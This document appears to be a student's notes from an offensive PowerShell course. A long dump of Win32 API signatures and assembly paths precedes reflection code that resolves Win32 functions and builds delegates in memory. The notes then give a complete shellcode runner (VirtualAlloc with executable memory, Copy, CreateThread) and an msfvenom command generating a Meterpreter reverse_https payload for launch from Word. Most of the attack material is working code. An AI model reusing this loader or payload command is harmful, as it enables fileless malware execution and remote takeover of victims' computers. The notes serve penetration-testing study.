SetClassLongPtr32                Method     static System.IntPtr SetClassLongPtr32(System.Runtime.InteropServices.HandleRef hwnd, int nIndex, System.IntPtr dwNewLong)                                                                                         
SetClassLongPtr64                Method     static System.IntPtr SetClassLongPtr64(System.Runtime.InteropServices.HandleRef hwnd, int nIndex, System.IntPtr dwNewLong)                                                                                         
SetConsoleCtrlHandler            Method     static bool SetConsoleCtrlHandler(Microsoft.Win32.NativeMethods+ConHndlr, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089 handler, int add)                                              
SetTimer                         Method     static System.IntPtr SetTimer(System.Runtime.InteropServices.HandleRef hWnd, System.Runtime.InteropServices.HandleRef nIDEvent, int uElapse, System.Runtime.InteropServices.HandleRef lpTimerProc)                 
SetWindowLong                    Method     static System.IntPtr SetWindowLong(System.Runtime.InteropServices.HandleRef hWnd, int nIndex, System.Runtime.InteropServices.HandleRef dwNewLong)                                                                  
SetWindowLongPtr32               Method     static System.IntPtr SetWindowLongPtr32(System.Runtime.InteropServices.HandleRef hWnd, int nIndex, System.Runtime.InteropServices.HandleRef dwNewLong)                                                             
SetWindowLongPtr64               Method     static System.IntPtr SetWindowLongPtr64(System.Runtime.InteropServices.HandleRef hWnd, int nIndex, System.Runtime.InteropServices.HandleRef dwNewLong)                                                             
TranslateMessage                 Method     static bool TranslateMessage([ref] Microsoft.Win32.NativeMethods+MSG, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089 msg)                                                               
UnregisterClass                  Method     static int16 UnregisterClass(string lpClassName, System.Runtime.InteropServices.HandleRef hInstance)                                                                                                               
VerLanguageName                  Method     static int VerLanguageName(int langID, System.Text.StringBuilder lpBuffer, int nSize)                                                                                                                              
VerQueryValue                    Method     static bool VerQueryValue(System.Runtime.InteropServices.HandleRef pBlock, string lpSubBlock, [ref] System.IntPtr lplpBuffer, [ref] int len)                                                                       
WldpIsDynamicCodePolicyEnabled   Method     static int WldpIsDynamicCodePolicyEnabled([ref] int enabled)                                                                                                                                                       
WldpQueryDynamicCodeTrust        Method     static int WldpQueryDynamicCodeTrust(Microsoft.Win32.SafeHandles.SafeFileHandle fileHandle, System.IntPtr image, uint32 imageSize)                                                                                 
WldpSetDynamicCodeTrust          Method     static int WldpSetDynamicCodeTrust(Microsoft.Win32.SafeHandles.SafeFileHandle fileHandle)                                                                                                                          
WTSRegisterSessionNotification   Method     static bool WTSRegisterSessionNotification(System.Runtime.InteropServices.HandleRef hWnd, int dwFlags)                                                                                                             
WTSUnRegisterSessionNotification Method     static bool WTSUnRegisterSessionNotification(System.Runtime.InteropServices.HandleRef hWnd)                                                                                                                        
FILE_ACTION_ADDED                Property   static int FILE_ACTION_ADDED {get;}                                                                                                                                                                                
FILE_ACTION_MODIFIED             Property   static int FILE_ACTION_MODIFIED {get;}                                                                                                                                                                             
FILE_ACTION_REMOVED              Property   static int FILE_ACTION_REMOVED {get;}                                                                                                                                                                              
FILE_ACTION_RENAMED_NEW_NAME     Property   static int FILE_ACTION_RENAMED_NEW_NAME {get;}                                                                                                                                                                     
FILE_ACTION_RENAMED_OLD_NAME     Property   static int FILE_ACTION_RENAMED_OLD_NAME {get;}                                                                                                                                                                     
FILE_ADD_FILE                    Property   static int FILE_ADD_FILE {get;}                                                                                                                                                                                    
FILE_ADD_SUBDIRECTORY            Property   static int FILE_ADD_SUBDIRECTORY {get;}                                                                                                                                                                            
FILE_APPEND_DATA                 Property   static int FILE_APPEND_DATA {get;}                                                                                                                                                                                 
FILE_ATTRIBUTE_ARCHIVE           Property   static int FILE_ATTRIBUTE_ARCHIVE {get;}                                                                                                                                                                           
FILE_ATTRIBUTE_COMPRESSED        Property   static int FILE_ATTRIBUTE_COMPRESSED {get;}                                                                                                                                                                        
FILE_ATTRIBUTE_DIRECTORY         Property   static int FILE_ATTRIBUTE_DIRECTORY {get;}                                                                                                                                                                         
FILE_ATTRIBUTE_HIDDEN            Property   static int FILE_ATTRIBUTE_HIDDEN {get;}                                                                                                                                                                            
FILE_ATTRIBUTE_NORMAL            Property   static int FILE_ATTRIBUTE_NORMAL {get;}                                                                                                                                                                            
FILE_ATTRIBUTE_OFFLINE           Property   static int FILE_ATTRIBUTE_OFFLINE {get;}                                                                                                                                                                           
FILE_ATTRIBUTE_READONLY          Property   static int FILE_ATTRIBUTE_READONLY {get;}                                                                                                                                                                          
FILE_ATTRIBUTE_SYSTEM            Property   static int FILE_ATTRIBUTE_SYSTEM {get;}                                                                                                                                                                            
FILE_ATTRIBUTE_TEMPORARY         Property   static int FILE_ATTRIBUTE_TEMPORARY {get;}                                                                                                                                                                         
FILE_CASE_PRESERVED_NAMES        Property   static int FILE_CASE_PRESERVED_NAMES {get;}                                                                                                                                                                        
FILE_CASE_SENSITIVE_SEARCH       Property   static int FILE_CASE_SENSITIVE_SEARCH {get;}                                                                                                                                                                       
FILE_CREATE_PIPE_INSTANCE        Property   static int FILE_CREATE_PIPE_INSTANCE {get;}                                                                                                                                                                        
FILE_DELETE_CHILD                Property   static int FILE_DELETE_CHILD {get;}                                                                                                                                                                                
FILE_EXECUTE                     Property   static int FILE_EXECUTE {get;}                                                                                                                                                                                     
FILE_FILE_COMPRESSION            Property   static int FILE_FILE_COMPRESSION {get;}                                                                                                                                                                            
FILE_FLAG_BACKUP_SEMANTICS       Property   static int FILE_FLAG_BACKUP_SEMANTICS {get;}                                                                                                                                                                       
FILE_FLAG_DELETE_ON_CLOSE        Property   static int FILE_FLAG_DELETE_ON_CLOSE {get;}                                                                                                                                                                        
FILE_FLAG_NO_BUFFERING           Property   static int FILE_FLAG_NO_BUFFERING {get;}                                                                                                                                                                           
FILE_FLAG_OVERLAPPED             Property   static int FILE_FLAG_OVERLAPPED {get;}                                                                                                                                                                             
FILE_FLAG_POSIX_SEMANTICS        Property   static int FILE_FLAG_POSIX_SEMANTICS {get;}                                                                                                                                                                        
FILE_FLAG_RANDOM_ACCESS          Property   static int FILE_FLAG_RANDOM_ACCESS {get;}                                                                                                                                                                          
FILE_FLAG_SEQUENTIAL_SCAN        Property   static int FILE_FLAG_SEQUENTIAL_SCAN {get;}                                                                                                                                                                        
FILE_FLAG_WRITE_THROUGH          Property   static int FILE_FLAG_WRITE_THROUGH {get;}                                                                                                                                                                          
FILE_LIST_DIRECTORY              Property   static int FILE_LIST_DIRECTORY {get;}                                                                                                                                                                              
FILE_NOTIFY_CHANGE_ATTRIBUTES    Property   static int FILE_NOTIFY_CHANGE_ATTRIBUTES {get;}                                                                                                                                                                    
FILE_NOTIFY_CHANGE_CREATION      Property   static int FILE_NOTIFY_CHANGE_CREATION {get;}                                                                                                                                                                      
FILE_NOTIFY_CHANGE_DIR_NAME      Property   static int FILE_NOTIFY_CHANGE_DIR_NAME {get;}                                                                                                                                                                      
FILE_NOTIFY_CHANGE_FILE_NAME     Property   static int FILE_NOTIFY_CHANGE_FILE_NAME {get;}                                                                                                                                                                     
FILE_NOTIFY_CHANGE_LAST_ACCESS   Property   static int FILE_NOTIFY_CHANGE_LAST_ACCESS {get;}                                                                                                                                                                   
FILE_NOTIFY_CHANGE_LAST_WRITE    Property   static int FILE_NOTIFY_CHANGE_LAST_WRITE {get;}                                                                                                                                                                    
FILE_NOTIFY_CHANGE_SECURITY      Property   static int FILE_NOTIFY_CHANGE_SECURITY {get;}                                                                                                                                                                      
FILE_NOTIFY_CHANGE_SIZE          Property   static int FILE_NOTIFY_CHANGE_SIZE {get;}                                                                                                                                                                          
FILE_PERSISTENT_ACLS             Property   static int FILE_PERSISTENT_ACLS {get;}                                                                                                                                                                             
FILE_READ_ATTRIBUTES             Property   static int FILE_READ_ATTRIBUTES {get;}                                                                                                                                                                             
FILE_READ_DATA                   Property   static int FILE_READ_DATA {get;}                                                                                                                                                                                   
FILE_READ_EA                     Property   static int FILE_READ_EA {get;}                                                                                                                                                                                     
FILE_SHARE_DELETE                Property   static int FILE_SHARE_DELETE {get;}                                                                                                                                                                                
FILE_SHARE_READ                  Property   static int FILE_SHARE_READ {get;}                                                                                                                                                                                  
FILE_SHARE_WRITE                 Property   static int FILE_SHARE_WRITE {get;}                                                                                                                                                                                 
FILE_TRAVERSE                    Property   static int FILE_TRAVERSE {get;}                                                                                                                                                                                    
FILE_TYPE_CHAR                   Property   static int FILE_TYPE_CHAR {get;}                                                                                                                                                                                   
FILE_TYPE_DISK                   Property   static int FILE_TYPE_DISK {get;}                                                                                                                                                                                   
FILE_TYPE_PIPE                   Property   static int FILE_TYPE_PIPE {get;}                                                                                                                                                                                   
FILE_TYPE_REMOTE                 Property   static int FILE_TYPE_REMOTE {get;}                                                                                                                                                                                 
FILE_TYPE_UNKNOWN                Property   static int FILE_TYPE_UNKNOWN {get;}                                                                                                                                                                                
FILE_UNICODE_ON_DISK             Property   static int FILE_UNICODE_ON_DISK {get;}                                                                                                                                                                             
FILE_VOLUME_IS_COMPRESSED        Property   static int FILE_VOLUME_IS_COMPRESSED {get;}                                                                                                                                                                        
FILE_WRITE_ATTRIBUTES            Property   static int FILE_WRITE_ATTRIBUTES {get;}                                                                                                                                                                            
FILE_WRITE_DATA                  Property   static int FILE_WRITE_DATA {get;}                                                                                                                                                                                  
FILE_WRITE_EA                    Property   static int FILE_WRITE_EA {get;}                                                                                                                                                                                    
GetFileExInfoStandard            Property   static int GetFileExInfoStandard {get;}                                                                                                                                                                            
OPEN_ALWAYS                      Property   static int OPEN_ALWAYS {get;}                                                                                                                                                                                      
OPEN_EXISTING                    Property   static int OPEN_EXISTING {get;}                                                                                                                                                                                    
C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Windows.Forms\v4.0_4.0.0.0__b77a5c561934e089\System.Windows.Forms.dll
C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Drawing\v4.0_4.0.0.0__b03f5f7f11d50a3a\System.Drawing.dll
C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll
C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Core\v4.0_4.0.0.0__b77a5c561934e089\System.Core.dll
Equals                           Method     static bool Equals(System.Object objA, System.Object objB)                                                                                                                                                         
ReferenceEquals                  Method     static bool ReferenceEquals(System.Object objA, System.Object objB)                                                                                                                                                
WaitNamedPipe                    Method     static bool WaitNamedPipe(string name, int timeout)                                                                                                                                                                
C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Configuration\v4.0_4.0.0.0__b03f5f7f11d50a3a\System.Configuration.dll
Equals                           Method     static bool Equals(System.Object objA, System.Object objB)                                                                                                                                                         
ReferenceEquals                  Method     static bool ReferenceEquals(System.Object objA, System.Object objB)                                                                                                                                                
C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Xml\v4.0_4.0.0.0__b77a5c561934e089\System.Xml.dll
Equals                           Method     static bool Equals(System.Object objA, System.Object objB)                                                                                                                                                         
ReferenceEquals                  Method     static bool ReferenceEquals(System.Object objA, System.Object objB)                                                                                                                                                
C:\Windows\Microsoft.Net\assembly\GAC_MSIL\Microsoft.PowerShell.GPowerShell\v4.0_3.0.0.0__31bf3856ad364e35\Microsoft.PowerShell.GPowerShell.dll
C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.ComponentModel.Composition\v4.0_4.0.0.0__b77a5c561934e089\System.ComponentModel.Composition.dll
C:\Windows\Microsoft.Net\assembly\GAC_MSIL\Microsoft.PowerShell.Editor\v4.0_3.0.0.0__31bf3856ad364e35\Microsoft.PowerShell.Editor.dll
C:\Windows\Microsoft.Net\assembly\GAC_MSIL\WindowsBase\v4.0_4.0.0.0__31bf3856ad364e35\WindowsBase.dll
C:\Windows\Microsoft.Net\assembly\GAC_MSIL\PresentationFramework\v4.0_4.0.0.0__31bf3856ad364e35\PresentationFramework.dll
C:\Windows\Microsoft.Net\assembly\GAC_64\PresentationCore\v4.0_4.0.0.0__31bf3856ad364e35\PresentationCore.dll
C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Xaml\v4.0_4.0.0.0__b77a5c561934e089\System.Xaml.dll
C:\Windows\Microsoft.Net\assembly\GAC_MSIL\UIAutomationProvider\v4.0_4.0.0.0__31bf3856ad364e35\UIAutomationProvider.dll
C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Runtime.Serialization\v4.0_4.0.0.0__b77a5c561934e089\System.Runtime.Serialization.dll
C:\Windows\Microsoft.Net\assembly\GAC_MSIL\Accessibility\v4.0_4.0.0.0__b03f5f7f11d50a3a\Accessibility.dll
C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Management\v4.0_4.0.0.0__b03f5f7f11d50a3a\System.Management.dll
C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.DirectoryServices\v4.0_4.0.0.0__b03f5f7f11d50a3a\System.DirectoryServices.dll
C:\Windows\Microsoft.Net\assembly\GAC_MSIL\Microsoft.Management.Infrastructure\v4.0_1.0.0.0__31bf3856ad364e35\Microsoft.Management.Infrastructure.dll
C:\Windows\Microsoft.Net\assembly\GAC_MSIL\PresentationFramework.Aero2\v4.0_4.0.0.0__31bf3856ad364e35\PresentationFramework.Aero2.dll
C:\Windows\Microsoft.Net\assembly\GAC_MSIL\PresentationFramework-SystemXml\v4.0_4.0.0.0__b77a5c561934e089\PresentationFramework-SystemXml.dll
C:\Windows\Microsoft.Net\assembly\GAC_64\System.Data\v4.0_4.0.0.0__b77a5c561934e089\System.Data.dll
C:\Windows\Microsoft.Net\assembly\GAC_MSIL\Microsoft.PowerShell.Security\v4.0_3.0.0.0__31bf3856ad364e35\Microsoft.PowerShell.Security.dll
C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Numerics\v4.0_4.0.0.0__b77a5c561934e089\System.Numerics.dll
C:\Windows\Microsoft.Net\assembly\GAC_64\System.Transactions\v4.0_4.0.0.0__b77a5c561934e089\System.Transactions.dll
C:\Windows\Microsoft.Net\assembly\GAC_MSIL\Microsoft.PowerShell.GraphicalHost\v4.0_3.0.0.0__31bf3856ad364e35\Microsoft.PowerShell.GraphicalHost.dll
C:\Windows\Microsoft.Net\assembly\GAC_MSIL\UIAutomationTypes\v4.0_4.0.0.0__31bf3856ad364e35\UIAutomationTypes.dll
C:\Windows\Microsoft.Net\assembly\GAC_MSIL\PresentationFramework-SystemData\v4.0_4.0.0.0__b77a5c561934e089\PresentationFramework-SystemData.dll
C:\Windows\Microsoft.Net\assembly\GAC_MSIL\PresentationFramework-SystemCore\v4.0_4.0.0.0__b77a5c561934e089\PresentationFramework-SystemCore.dll
C:\Windows\system32\WinMetadata\Windows.UI.winmd
C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Runtime.InteropServices.WindowsRuntime\v4.0_4.0.0.0__b03f5f7f11d50a3a\System.Runtime.InteropServices.WindowsRuntime.dll
C:\Windows\Microsoft.Net\assembly\GAC_MSIL\Microsoft.PowerShell.Commands.Utility\v4.0_3.0.0.0__31bf3856ad364e35\Microsoft.PowerShell.Commands.Utility.dll
C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Configuration.Install\v4.0_4.0.0.0__b03f5f7f11d50a3a\System.Configuration.Install.dll
C:\Windows\Microsoft.Net\assembly\GAC_MSIL\SMDiagnostics\v4.0_4.0.0.0__b77a5c561934e089\SMDiagnostics.dll
C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.ServiceModel.Internals\v4.0_4.0.0.0__31bf3856ad364e35\System.ServiceModel.Internals.dll

C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System.Security\v4.0_4.0.0.0__b03f5f7f11d50a3a\System.Security.dll
```

more filtering
We’ll use the Split151 method to split it into an array based on the directory delimiter (\).
Finally, we select the last element of the split string array with the “-1” index and check if it is equal 
to “System.dll”.
Using GetType to obtain a reference to the System.dll assembly at runtime is an example of the 
Reflection152 technique. This is a very powerful feature that allows us to dynamically obtain 
references to objects that are otherwise private or internal.
We’ll use this technique once again with the GetMethod153 function to obtain a reference to the 
internal GetModuleHandle method:

```ps1
$systemdll = 
([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { 
 $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') })
$unsafeObj = $systemdll.GetType('Microsoft.Win32.UnsafeNativeMethods')
$GetModuleHandle = $unsafeObj.GetMethod('GetModuleHandle')
$user32 = $GetModuleHandle.Invoke($null, @("user32.dll"))
$tmp=@()
$unsafeObj.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
$GetProcAddress = $tmp[1]
$GetProcAddress.Invoke($null, @($user32, "MessageBoxA"))
```

compacting it into a lookup func

```ps1
function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
    Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, 
    @($moduleName)), $functionName))
}
```

### 3.6.2.1 Exercises
1. Go through the PowerShell code in this section and dump the wanted methods to disclose 
the location of GetModuleHandle and GetProcAddress and perform a lookup of a different 
Win32 API.

not happening

2. What happens if we use the second entry in the $tmp array?

```sh
PS C:\Users\misthios> $systemdll = 
([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { 
 $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') })
$unsafeObj = $systemdll.GetType('Microsoft.Win32.UnsafeNativeMethods')
$GetModuleHandle = $unsafeObj.GetMethod('GetModuleHandle')
$user32 = $GetModuleHandle.Invoke($null, @("user32.dll"))
$tmp=@()
$unsafeObj.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
$GetProcAddress = $tmp[1]
$GetProcAddress.Invoke($null, @($user32, "MessageBoxA"))
Exception calling "Invoke" with "2" argument(s): "Object of type 'System.IntPtr' cannot be converted to type 
'System.Runtime.InteropServices.HandleRef'."
At line:10 char:1
+ $GetProcAddress.Invoke($null, @($user32, "MessageBoxA"))
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : ArgumentException
```

# Delegate type reflection

Now that we can resolve addresses of the Win32 APIs, we must define the argument types.
The information about the number of arguments and their associated data types must be paired 
with the resolved function memory address. In C# this is done using the 
GetDelegateForFunctionPointer156 method. This method takes two arguments, first the memory 
address of the function, and second the function prototype represented as a type

In C#, a function prototype is known as a Delegate157 or delegate type. A declaration creating the 
delegate type in C# for MessageBox is given in Listing 82.

```C#
int delegate MessageBoxSig(IntPtr hWnd, String text, String caption, int options)
```

Unfortunately, there is no equivalent to the delegate keyword in PowerShell so we must obtain 
this in a different manner. Luckily, Microsoft described how a delegate type may be created using 
reflection in an old blog post from 2004.
As we know from our usage of Add-Type, the delegate type is created when the assembly is 
compiled, but instead we will manually create an assembly in memory and populate it with 
content.

The first step is to create a new assembly object through the AssemblyName160 class and assign 
it a name like ReflectedDelegate. We do this by creating a new variable called $MyAssembly and 
setting it to the instantiated assembly object with the name “ReflectedDelegate”:
`$MyAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')`

Before we populate the assembly, we must configure its access mode. This is an important 
permission, because we want it to be executable and not saved to disk. This can be achieved 
through the DefineDynamicAssembly161 method, first by supplying the custom assembly name. 
Then we set it as executable by supplying the Run162 access mode value defined in the 
System.Reflection.Emit.AssemblyBuilderAccess namespace as the second argument.

```
$Domain = [AppDomain]::CurrentDomain
$MyAssemblyBuilder = $Domain.DefineDynamicAssembly($MyAssembly, 
 [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
```

With permissions set on the assembly, we can start creating content. Inside an assembly, the 
main building block is a Module. We can create this Module through the DefineDynamicModule163
method. We supply a custom name for the module and tell it not to include symbol information.

```
$MyModuleBuilder = $MyAssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
```
Now we can create a custom type that will become our delegate type. We can do this within the 
module, using the DefineType method.

To do this, we need to set three arguments. The first is the custom name, in our case 
MyDelegateType. The second is the combined list of attributes for the type.165 In our case, we 
must specify the type to be a class (so we can later instantiate it), public, non-extendable, and use 
ASCII instead of Unicode. Finally, it is set to be interpreted automatically since our testing found 
that this undocumented setting was required. The attributes then become Class, Public, Sealed, 
AnsiClass, and AutoClass.
As a third argument, we must specify the type it builds on top of. We choose the 
MulticastDelegate class166 to create a delegate type with multiple entries which will allow us to 
call the target API with multiple arguments.
Here is the code for defining the custom type:

```
$MyTypeBuilder = $MyModuleBuilder.DefineType('MyDelegateType', 
 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate]
```

Finally, we are ready to put the function prototype inside the type and let it become our custom 
delegate type. This process is shown in Listing 87:
```
$MyConstructorBuilder = $MyTypeBuilder.DefineConstructor(
 'RTSpecialName, HideBySig, Public', 
 [System.Reflection.CallingConventions]::Standard, 
 @([IntPtr], [String], [String], [int]))
```
and there are more explanations I will simply skip it when I want.

and got to the reflective injection code --

```ps1
function LookupFunc {
 Param ($moduleName, $functionName)
 $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
 Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
 Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
 $tmp=@()
 $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
 return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, 
@($moduleName)), $functionName))
}
$MessageBoxA = LookupFunc user32.dll MessageBoxA
$MyAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
$Domain = [AppDomain]::CurrentDomain
$MyAssemblyBuilder = $Domain.DefineDynamicAssembly($MyAssembly, 
 [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
$MyModuleBuilder = $MyAssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
$MyTypeBuilder = $MyModuleBuilder.DefineType('MyDelegateType', 
 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
$MyConstructorBuilder = $MyTypeBuilder.DefineConstructor(
 'RTSpecialName, HideBySig, Public', 
 [System.Reflection.CallingConventions]::Standard, 
 @([IntPtr], [String], [String], [int]))
$MyConstructorBuilder.SetImplementationFlags('Runtime, Managed')
$MyMethodBuilder = $MyTypeBuilder.DefineMethod('Invoke', 
 'Public, HideBySig, NewSlot, Virtual', 
 [int], 
 @([IntPtr], [String], [String], [int]))
$MyMethodBuilder.SetImplementationFlags('Runtime, Managed')
$MyDelegateType = $MyTypeBuilder.CreateType()
$MyFunction = [System.Runtime.InteropServices.Marshal]::
 GetDelegateForFunctionPointer($MessageBoxA, $MyDelegateType)
$MyFunction.Invoke([IntPtr]::Zero,"Hello World","This is My MessageBox",0)
```

### 3.6.3.1 Exercises
1. Use the PowerShell code to call MessageBoxA using reflection instead of Add-Type.

done above need to go back and revise.

2. Use Process Monitor to verify that no C# source code is written to disk or compiled.

![](./reflective_no_writefile.png)

3. The Win32 WinExec API can be used to launch applications. Modify the existing code to 
resolve and call WinExec and open Notepad. Use resources such as MSDN and P/Invoke to 
understand the arguments for the function and the associated data types.

```ps1
function LookupFunc {
 Param ($moduleName, $functionName)
 $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
 Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
 Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
 $tmp=@()
 $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
 return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, 
@($moduleName)), $functionName))
}function LookupFunc {
 Param ($moduleName, $functionName)
 $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
 Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
 Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
 $tmp=@()
 $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
 return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, 
@($moduleName)), $functionName))
}

LookupFunc kernel32.dll WinExec

$WinExec = LookupFunc kernel32.dll WinExec

$MyAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
$Domain = [AppDomain]::CurrentDomain
$MyAssemblyBuilder = $Domain.DefineDynamicAssembly($MyAssembly, 
 [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
$MyModuleBuilder = $MyAssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)

$MyTypeBuilder = $MyModuleBuilder.DefineType('MyDelegateType', 
 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

# static extern uint WinExec(string lpCmdLine, uint uCmdShow);

$MyConstructorBuilder = $MyTypeBuilder.DefineConstructor(
 'RTSpecialName, HideBySig, Public', 
 [System.Reflection.CallingConventions]::Standard, 
 @([String], [int]))

$MyConstructorBuilder.SetImplementationFlags('Runtime, Managed')
$MyMethodBuilder = $MyTypeBuilder.DefineMethod('Invoke', 
 'Public, HideBySig, NewSlot, Virtual', 
 [int], 
 @([String], [int]))

$MyMethodBuilder.SetImplementationFlags('Runtime, Managed')
$MyDelegateType = $MyTypeBuilder.CreateType()
$MyFunction = [System.Runtime.InteropServices.Marshal]::
 GetDelegateForFunctionPointer($WinExec, $MyDelegateType)

$MyFunction.Invoke("notepad.exe",1)
```

This opens up a notepad.exe

# Reflection Shellcode Runner in Powershell


just looking at the final code : 

```ps1

function LookupFunc {
 Param ($moduleName, $functionName)
 $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
 Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
 Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
 $tmp=@()
 $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
 return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, 
@($moduleName)), $functionName))
}
function getDelegateType {
 Param (
 [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
 [Parameter(Position = 1)] [Type] $delType = [Void]
 )
 $type = [AppDomain]::CurrentDomain.
 DefineDynamicAssembly((New-Object 
System.Reflection.AssemblyName('ReflectedDelegate')), 
 [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
 DefineDynamicModule('InMemoryModule', $false).
 DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
 [System.MulticastDelegate])
 $type.
 DefineConstructor('RTSpecialName, HideBySig, Public', 
[System.Reflection.CallingConventions]::Standard, $func).
 SetImplementationFlags('Runtime, Managed')
 $type.
 DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
 SetImplementationFlags('Runtime, Managed')
 return $type.CreateType()
}
$lpMem = 

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc 
kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) 
([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0...
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
$hThread = 
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc 
kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], 
[UInt32], [IntPtr]) 
([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc 
kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) 
([Int]))).Invoke($hThread, 0xFFFFFFFF)

```

The next step is to generate the shellcode in ps1 format, remembering to choose 32-bit 
architecture due to PowerShell spawning as a 32-bit child process of Word. With the shellcode 
generated, we can copy it using the .NET Copy :

```sh
└─$ msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.6.12 LPORT=443 EXITFUNC=thread -f ps1 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 561 bytes
Final size of ps1 file: 2760 bytes
